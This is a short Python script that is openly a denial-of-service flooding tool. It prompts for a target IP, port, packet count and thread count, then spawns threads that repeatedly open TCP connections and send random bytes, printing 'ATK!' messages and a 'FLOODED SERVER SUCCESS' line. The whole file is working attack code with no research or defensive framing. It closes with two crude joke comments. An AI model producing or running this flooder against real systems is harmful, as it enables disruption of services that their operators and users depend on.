import socket
import threading
import random

ADR = str(input('$ 1: ')) #ip     
MM = int(input('$ 2: ')) #port    
PCK = int(input('$ 3: ')) #packets
THRD = int(input('$ 4: ')) #threads



def BEGIN():
    hh = random._urandom(10)
    ll = int(0)
    while 3 > 2:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ADR, MM))
            s.send(hh)
            for x in range(PCK):
                s.send(hh)
            ll += 1
            print('ATK!' +ADR+' | SEND: ' +str(ll))

        except:
           s.close()
           print("ATK! CMP: PACKETS FLOODED SERVER SUCCESS!")
input()



for l in range(THRD):
    THR = threading.Thread(target=BEGIN)
    THR.start()

# yes i suck toes 🤡
# yes i lick feet 💀